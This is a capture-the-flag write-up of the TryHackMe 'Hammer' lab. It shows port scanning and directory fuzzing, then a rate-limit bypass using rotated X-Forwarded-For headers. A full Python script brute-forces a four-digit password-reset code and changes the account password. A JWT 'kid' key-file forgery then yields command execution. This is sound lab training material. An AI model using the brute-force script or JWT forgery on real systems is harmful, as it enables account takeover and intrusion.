-----------------

### CTF: TRYHACKME
### LAB-: Hammer

------------------

![image](https://github.com/user-attachments/assets/6d3f840e-8846-497c-b59e-27cdce793f72)

------------------

- Rustscan's result

```bash
❯ rustscan -a 10.10.239.251  -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.239.251:22
Open 10.10.239.251:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 15:56 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:56
Completed NSE at 15:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:56
Completed NSE at 15:56, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:56
Completed NSE at 15:56, 0.01s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:56
Completed Parallel DNS resolution of 1 host. at 15:56, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:56
Scanning 10.10.239.251 [2 ports]
Discovered open port 22/tcp on 10.10.239.251
Discovered open port 1337/tcp on 10.10.239.251
Completed Connect Scan at 15:56, 0.21s elapsed (2 total ports)
Initiating Service scan at 15:56
Scanning 2 services on 10.10.239.251
Completed Service scan at 15:56, 11.60s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.239.251.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:56
Completed NSE at 15:56, 5.23s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:56
Completed NSE at 15:56, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:56
Completed NSE at 15:56, 0.00s elapsed
Nmap scan report for 10.10.239.251
Host is up, received user-set (0.21s latency).
Scanned at 2024-11-22 15:56:14 WAT for 19s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:d7:2e:22:58:08:43:87:40:6d:d6:85:99:85:49:dd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh6dlQMaNzf2sdznd6Eo30iuUOGxnzTQtg7Zz+gifV+XQ1dKPbzgvHfo4fkBGKr4/Fx8KOIywspSWmWSblEuR4GrCRkGZQIsh1TkCn35lmy2AhcHUCHbUfZVtR0ZDAu+GJIm29+/lyd7M+Bgg0lZTU20eBnYCwBAapfso3EcC4lA+tQ7ZnVTrn+vJy+yI33hxMNldxn5OSLzbdldaYxujdA6WQ3aTXpPGXFMN9+lGebCMHkJqea6H/EYtyhF8+LMwGJ9epGYZwWSDcY9H9WQ6SgufPGTnbMN22ULHJXrNB1On9Zcrls2V1SRerf2YEdibxoLVZc2kjLXysxaqHgagJcrN0kax8Dic5R80b3KvHusKiIQIgaWRLo/n8viQJCkDKHWGHnN9e9cbjV2WGWlAMlvFkiTTzvufilC2miReHc410wLrOO8FIaFIHG8jcl6UdU9HBJ/Fp4DDeU9Vnw5sOKGlTOEhYQ7kl4v9Po2v04bh4TWJUolGnHRD2cSuXa0=
|   256 bb:42:a7:23:79:25:49:f4:c7:0b:9d:bd:73:aa:df:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBByzKQzF757m04UmtXmmg5MyWexp6iePwrRJW0XATYP60aEw7JMCJEh+K5kYIo/sFbpx19s6ijJKs578b8tmaes=
|   256 5a:c3:c8:08:50:30:22:b5:01:ca:e4:86:90:14:21:d1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFWNSYbayjte/6Oe7E7ZCf2MxWRUIT+w277xuEToajll
1337/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Ffuf's res

- In the source of the index page, I discovered an hint stating that directories where created with format `hmr_<name>`.

![image](https://github.com/user-attachments/assets/b0b1fdb8-6bb6-4612-a2b0-c9d72636e733)

- Ffuf's result using `hmr`

 ![image](https://github.com/user-attachments/assets/db64cd1c-5594-481d-b3d0-bed9e9a0cc92)

- I checked `hmr_logs` and discovered a file `errors_logS` which leaked an email `tester@hammer.thm`

![image](https://github.com/user-attachments/assets/85364c61-8c46-4776-971c-a2c7d85416bc)

### RATE-LIMITING

- I verified the email in the `reset_password.php` page.

![image](https://github.com/user-attachments/assets/8f28eb8a-b0c2-4b5f-98f3-58a79250de32)

- I intercepted the page and tried to fuzz the otp but I noticed a rate-limiting heder in the response.A user can only make 10 requests in a row and if it is more than that a `rate limit` message will pop up.

![image](https://github.com/user-attachments/assets/2541ffb8-859e-4b2b-89a0-284a97ae8742)

- After playing with headers, I noticed that a user's ip can make 9 requests and if the user's ip is changed to another one with `X-Forwarded-For`, the user's tries will reset to default as seen below.To sum it up,changing the request's ip after 8 requests can bypass the rate-limiting filter.It is crucial to note that this rate-limit header is based on sessions.

![image](https://github.com/user-attachments/assets/b17a7b61-aa9b-4c85-938c-854a78588221)

![image](https://github.com/user-attachments/assets/f0c6d58a-a8a4-4d88-a92e-f2f503201686)

- I wrote a python script to bruteforce the otp and it took multiple tries to get it because we have to bruteforce within `180 seconds`. The script also changes the password.

```python3
#! /usr/bin/env python3
from ten import *
from dataclasses import dataclass
import random
import multiprocessing

set_message_formatter("Oldschool")
@entry
@arg("h","host")
@dataclass
class Exploit:
      host: str
      @staticmethod
      def change_password(session: object,headers: dict) -> str:
          password = "nippedbud"
          msg_info(f"Changing password to {password}")
          data = {"new_password":password,"confirm_password":password}
          response =  session.post("/reset_password.php",data=data,headers=headers)
          msg_info(response.text)
          msg_info(f"New Password: {password}")
      def run(self):
          session = ScopedSession(self.host)
          endpoint = "/reset_password.php"
          #Entering email
          data = {"email":"tester@hammer.thm"}
          response = session.post(endpoint,data=data)
          headers = response.headers
          cookie = headers["Set-Cookie"]
          msg_info(f"Email: {data['email']}:{cookie}")
          msg_info("Brute_forcing 4-key OTP")
          digit = 60
          for i in range(999,10000):
              #s will be set to 1000 to prevent time from elapsing
              data = {"recovery_code":i,"s":digit}
              ip = f"127.0.{random.randint(0,255)}.{random.randint(0,255)}"
              headers = {"X-Forwarded-For":ip,"X-Forwarded-For":ip,"cookie":cookie}
              msg_info(f"Trying otp-code-{i}")
              resp2 = session.post(endpoint,data=data,headers=headers,allow_redirects=True,timeout=400000)
              if resp2.contains("Invalid or expired recovery code!"):
                 msg_failure("Incorrect OTP")
              elif resp2.contains("New Password"):
                   Exploit.change_password(session,headers)
                   leave("Done")
              else:
                leave("Elapsed time")

if __name__ == "__main__":
   process = multiprocessing.Process(target=Exploit)
   process.start()
   process.join()
```

![image](https://github.com/user-attachments/assets/2d0ef830-19f4-4062-9811-e7d64bcaedff)

- Now we can login as user `tester` with password `nippedbud`

![image](https://github.com/user-attachments/assets/d3bebd2a-9d31-4311-9b05-aca03e00ce38)

- I tried to execute shell_command `ls` and spotted a jwt token in the request.

![image](https://github.com/user-attachments/assets/d17207d5-51f5-4422-a431-5fcbcc3c9907)

- After decoding the with `jwt.io`, I noticed the `kid` header reads a key stored in a file `/var/www/mykey.key`.

![image](https://github.com/user-attachments/assets/53e7f09a-7168-4fcc-a8b7-6b41e0595318)

### JWT Bypass

- In this scenario,if we can point header `kid` to another key,we can use the new key that we specified to sign the token.
- I ran `ls` in the `execute_command.php` page and noticed a key in the current directory.A normal user can only run `ls` in the page.Only an admin can run other commands

![image](https://github.com/user-attachments/assets/b59355c0-be30-4fb6-b41c-6e70198acf5a)

- Contents of the key file

![image](https://github.com/user-attachments/assets/3de1bfde-c4fe-46ec-bdbe-30c55746ae00)

- I signed a new cookie with `jwt.io`.

![image](https://github.com/user-attachments/assets/b0e4b2dc-46da-41af-a7a1-0f1b7a5c91fd)

- RCE achieved-:

![image](https://github.com/user-attachments/assets/02b38593-b1a7-466e-bff3-d31f0136a413)


-------------------

### THANKS FOR READING

-------------------












